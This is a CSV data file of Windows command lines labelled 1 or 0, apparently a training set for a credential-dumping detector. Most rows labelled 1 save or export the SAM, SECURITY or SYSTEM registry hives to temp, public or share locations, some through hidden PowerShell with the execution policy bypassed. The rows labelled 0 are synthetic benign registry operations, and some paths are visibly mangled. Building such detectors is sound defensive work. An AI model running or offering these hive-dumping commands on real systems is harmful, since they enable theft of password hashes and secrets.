text,label
cmd.exe /c start /b reg.exe export hklm\security   c:\temp\system.hive,1
cmd.exe /c reg.exe  save hkey_local_machine\security   %temp%\sec_backup.dat   /y,1
c:\windows\system32\cmd.exe /k reg save  hklm\security   %temp%\sec_backup.dat,1
"powershell -c reg.exe  unload  ""hkcu\software\policies\mycorp""",0
"cmd /c reg.exe query ""hkey_current_user\hkey_local_machine\software\policies\microsoft"" /v path",0
cmd.exe /c start /b reg export  hklm\sam   %temp%\sec_backup.dat,1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\system %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg save hklm\system  c:\users\public\registry_export.reg /y,1
powershell -command reg   export hkey_local_machine\system  c:\windows\temp\sam.save /y,1
"cmd /c powershell -c ""reg export   hklm\security  \\localhost\c$\__dump\sam.bak   /y""",1
"reg   copy   ""hkey_current_user\system\currentcontrolset\services\subkey10""   ""hkey_current_user\system\currentcontrolset\services_375""",0
"cmd /c reg copy ""hkey_users\control panel\desktop"" ""hkey_users\control panel\desktop_487""",0
"reg.exe  add  ""hkcu\control panel\desktop\subkey89""",0
"start /b reg   delete   ""hkey_users\hkey_local_machine\software\wow6432node\subkey59""   /v lastupdate",0
cmd.exe /c reg export hklm\system  %temp%\sec_backup.dat,1
"powershell -c reg.exe  unload  ""hkey_users\hkey_local_machine\system\currentcontrolset\control""  /v lastupdate",0
powershell -command reg.exe   save  hklm\security  %temp%\sec_backup.dat,1
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
"reg.exe   restore   ""hkcu\software\policies\mycorp\subkey34""   ""hkcu\system\currentcontrolset\services_355""",0
"cmd /c powershell -c ""reg   save hklm\sam  \\localhost\c$\__dump\sam.bak""",1
"reg.exe delete ""hkey_local_machine\environment"" /v lastupdate",0
cmd.exe /c reg.exe  export  hklm\security c:\users\public\registry_export.reg,1
"cmd /c reg.exe   compare   ""hku\software\classes\subkey86""   ""hku\software\policies\mycorp_543""",0
"powershell -c reg compare ""hku\software\microsoft\windows\currentversion\subkey24"" ""hku\control panel\desktop_169""",0
reg.exe  save   hkey_local_machine\sam  c:\users\public\registry_export.reg  /y,1
"reg.exe   add   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey59""   /v path   /t reg_dword   /d 1",0
pwsh -noprofile -c reg.exe  export   hkey_local_machine\system c:\temp\system.hive  /y,1
"reg.exe   delete   ""hkey_local_machine\software\myapp\settings""",0
cmd.exe /c start /b reg save hklm\security c:\temp\system.hive /y,1
pwsh -noprofile -c reg.exe  save  hkey_local_machine\security   %temp%\sec_backup.dat,1
"reg.exe add ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey99"" /v version  /d 1",0
powershell -command reg.exe   export  hkey_local_machine\security  c:\temp\system.hive,1
"start /b reg.exe   unload   ""hku\hkey_local_machine\software\wow6432node\subkey93""   /f",0
"reg  restore  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\system\currentcontrolset\services_231""",0
cmd.exe /c start /b reg.exe   save  hkey_local_machine\security   c:\users\public\registry_export.reg  /y,1
cmd.exe /c reg  save   hklm\system \.\c$ackup.reg,1
"cmd /c powershell -c ""reg.exe  save   hklm\security   \.\c$ackup.reg   /y""",1
"reg.exe delete ""hku\software\google\chrome\subkey24""",0
"start /b reg.exe copy ""hkey_current_user\control panel\desktop"" ""hkey_current_user\software\myapp\settings_490""",0
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey16""  ""c:\users\public\chrome_data.bak""",0
"start /b reg   compare   ""hkey_users\environment""   ""hkey_users\hkey_local_machine\software\wow6432node_498""",0
"reg.exe   add   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey31""   /v version      /d ""c:\program files\app""",0
reg export hkey_local_machine\security c:\temp\system.hive,1
"reg copy ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey16"" ""hkey_local_machine\software\policies\mycorp_880""",0
"reg  save  ""hkcu\environment\subkey30""  ""c:\users\public\chrome_data.bak""",0
cmd.exe /c reg save hkey_local_machine\security   c:\users\public\registry_export.reg  /y,1
"cmd /c powershell -c ""reg  save   hklm\sam  %temp%\sec_backup.dat""",1
"reg.exe  add  ""hku\software\microsoft\windows\currentversion""  /f  /t reg_sz  /d ""1.0.0""",0
"powershell -c reg  restore  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""hkey_local_machine\control panel\desktop_649""",0
"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\sam   c:\users\public\registry_export.reg  /y""",1
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\system  %temp%\sec_backup.dat,1
"reg.exe   copy   ""hkey_users\software\microsoft\windows\currentversion""   ""hkey_users\software\classes_410""",0
"start /b reg.exe   add   ""hkey_users\software\policies\mycorp\subkey10""   /v version",0
powershell -command reg.exe export hklm\system   c:\temp\system.hive,1
"reg add ""hku\hkey_local_machine\software\policies\microsoft"" /v lastupdate",0
powershell -command reg.exe   export   hklm\security   \.\c$ackup.reg  /y,1
reg save  hklm\system \.\c$ackup.reg,1
reg.exe export hklm\sam  c:\windows\temp\sam.save   /y,1
c:\windows\system32\cmd.exe /k reg.exe   export  hkey_local_machine\sam  c:\users\public\registry_export.reg,1
"start /b reg   save   ""hku\environment""   ""d:\backup\registry_hive.dat""   /y",0
pwsh -noprofile -c reg.exe   save hkey_local_machine\security c:\windows\temp\sam.save /y,1
"reg.exe copy ""hku\system\currentcontrolset\services"" ""hku\system\currentcontrolset\services_360""",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak  /y,1
"reg restore ""hkcu\environment"" ""hkcu\hkey_local_machine\software\wow6432node_227""",0
powershell -exec bypass -w hidden -c reg export  hkey_local_machine\security   c:\users\public\registry_export.reg  /y,1
"start /b reg.exe add ""hkey_users\hkey_local_machine\software\wow6432node"" /v version /t reg_dword /d ""c:\program files\app""",0
powershell -exec bypass -w hidden -c reg.exe export hklm\system   c:\windows\temp\sam.save,1
reg   export hklm\sam  %temp%\sec_backup.dat  /y,1
pwsh -noprofile -c reg save hkey_local_machine\security \.\c$ackup.reg,1
"cmd /c powershell -c ""reg.exe   save  hklm\system  \\localhost\c$\__dump\sam.bak  /y""",1
cmd.exe /c reg   save hklm\security \\localhost\c$\__dump\sam.bak,1
"reg.exe  compare  ""hkey_current_user\hkey_local_machine\software\policies\microsoft""  ""hkey_current_user\control panel\desktop_697""",0
powershell -command reg  save   hklm\security  \.\c$ackup.reg,1
reg.exe export   hkey_local_machine\security c:\users\public\registry_export.reg /y,1
powershell -exec bypass -w hidden -c reg   export hklm\system %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe   save hkey_local_machine\sam  c:\users\public\registry_export.reg  /y,1
"reg.exe delete ""hkey_users\software\microsoft\windows\currentversion\subkey51"" /v path",0
"cmd /c reg copy ""hku\control panel\desktop\subkey62"" ""hku\software\classes_725""",0
"cmd /c reg  unload  ""hkey_local_machine\environment""  /v lastupdate",0
cmd.exe /c reg.exe  save hkey_local_machine\system c:\users\public\registry_export.reg,1
"reg compare ""hkey_local_machine\software\policies\mycorp\subkey51"" ""hkey_local_machine\software\google\chrome_592""",0
"cmd /c powershell -c ""reg.exe   export   hklm\sam   c:\users\public\registry_export.reg""",1
powershell -command reg   save  hkey_local_machine\security \.\c$ackup.reg,1
pwsh -noprofile -c reg save  hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak  /y,1
pwsh -noprofile -c reg.exe save hkey_local_machine\security c:\users\public\registry_export.reg   /y,1
"start /b reg  add  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  /v path    /d ""1.0.0""",0
"start /b reg.exe query ""hkcu\software\microsoft\windows\currentversion"" /f",0
powershell -command reg.exe  export   hkey_local_machine\system \.\c$ackup.reg  /y,1
"cmd /c reg.exe  copy  ""hkey_current_user\hkey_local_machine\software\wow6432node""  ""hkey_current_user\software\microsoft\windows\currentversion_298""",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey95"" ""c:\users\public\chrome_data.bak""",0
powershell -exec bypass -w hidden -c reg export   hkey_local_machine\sam   c:\temp\system.hive  /y,1
pwsh -noprofile -c reg.exe   export   hkey_local_machine\sam %temp%\sec_backup.dat,1
cmd.exe /c start /b reg   save  hkey_local_machine\sam   \.\c$ackup.reg   /y,1
"start /b reg.exe unload ""hkey_users\software\microsoft\windows\currentversion\subkey2""",0
cmd.exe /c start /b reg.exe  save hkey_local_machine\system   %temp%\sec_backup.dat,1
"start /b reg unload ""hkey_users\software\google\chrome""",0
"reg.exe  unload  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  /v path",0
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\sam %temp%\sec_backup.dat,1
reg.exe   save  hklm\security  c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg export hklm\system   \.\c$ackup.reg   /y,1
cmd.exe /c reg.exe   export hkey_local_machine\system   \.\c$ackup.reg,1
"start /b reg  unload  ""hkey_local_machine\software\classes""  /f",0
reg   save hkey_local_machine\security c:\windows\temp\sam.save,1
"start /b reg.exe   copy   ""hkcu\hkey_local_machine\software\wow6432node\subkey31""   ""hkcu\hkey_local_machine\system\currentcontrolset\control_293""",0
cmd.exe /c reg export hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
"powershell -c reg.exe  add  ""hkey_users\software\policies\mycorp\subkey29""  /f  /t reg_dword  /d 1",0
"reg   compare   ""hku\software\myapp\settings\subkey99""   ""hku\control panel\desktop_134""",0
"reg.exe  restore  ""hkey_local_machine\software\microsoft\windows\currentversion""  ""hkey_local_machine\software\myapp\settings_309""",0
"reg   unload   ""hku\system\currentcontrolset\services\subkey72""   /v lastupdate",0
"reg.exe   unload   ""hkey_local_machine\software\policies\mycorp""",0
cmd.exe /c reg  save  hklm\security c:\windows\temp\sam.save  /y,1
"powershell -c reg.exe copy ""hkcu\hkey_local_machine\software\wow6432node"" ""hkcu\control panel\desktop_734""",0
"reg.exe  unload  ""hkey_local_machine\software\policies\mycorp\subkey96""  /v lastupdate",0
pwsh -noprofile -c reg.exe  export   hklm\sam   %temp%\sec_backup.dat,1
"powershell -c reg.exe copy ""hkey_current_user\control panel\desktop"" ""hkey_current_user\software\myapp\settings_358""",0
cmd.exe /c reg export  hklm\system %temp%\sec_backup.dat,1
"start /b reg.exe  delete  ""hkey_users\system\currentcontrolset\services\subkey69""  /v version",0
"reg.exe restore ""hkey_current_user\software\microsoft\windows\currentversion\subkey86"" ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_107""",0
"cmd /c powershell -c ""reg.exe save hklm\system  c:\temp\system.hive /y""",1
"powershell -c reg.exe   restore   ""hkcu\software\classes\subkey89""   ""hkcu\control panel\desktop_214""",0
"reg.exe  copy  ""hkey_users\software\microsoft\windows\currentversion\subkey43""  ""hkey_users\software\google\chrome_188""",0
reg save   hklm\sam  \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save  hkey_local_machine\security  %temp%\sec_backup.dat  /y,1
"reg   compare   ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey34""   ""hkey_users\control panel\desktop_410""",0
"reg delete ""hkey_users\environment\subkey68"" /v path",0
"reg.exe   add   ""hkcu\hkey_local_machine\software\wow6432node""   /f   /t reg_dword   /d 1",0
"cmd /c reg   copy   ""hku\software\microsoft\windows\currentversion""   ""hku\software\myapp\settings_850""",0
"reg   copy   ""hkey_current_user\control panel\desktop\subkey92""   ""hkey_current_user\software\myapp\settings_280""",0
"reg.exe  query  ""hkey_current_user\environment\subkey9""  /v version",0
cmd.exe /c start /b reg  save hklm\sam   %temp%\sec_backup.dat  /y,1
powershell -command reg  save hkey_local_machine\security   c:\temp\system.hive /y,1
pwsh -noprofile -c reg.exe  export  hklm\system   \.\c$ackup.reg,1
"powershell -c reg.exe  add  ""hkey_users\environment""  /f  /t reg_dword",0
cmd.exe /c reg save hkey_local_machine\sam   \.\c$ackup.reg,1
"powershell -c reg  restore  ""hku\control panel\desktop\subkey63""  ""hku\environment_228""",0
"powershell -c reg.exe  restore  ""hku\software\google\chrome""  ""hku\software\classes_470""",0
"reg delete ""hkcu\software\microsoft\windows\currentversion""",0
reg export   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
"reg  unload  ""hkey_current_user\software\policies\mycorp\subkey20""",0
"cmd /c powershell -c ""reg.exe  export   hkey_local_machine\system  c:\users\public\registry_export.reg""",1
powershell -exec bypass -w hidden -c reg.exe save   hklm\sam c:\users\public\registry_export.reg,1
reg   save  hkey_local_machine\sam  %temp%\sec_backup.dat,1
"reg save ""hkey_users\environment\subkey62"" ""c:\windows\temp\software_dump.dat""",0
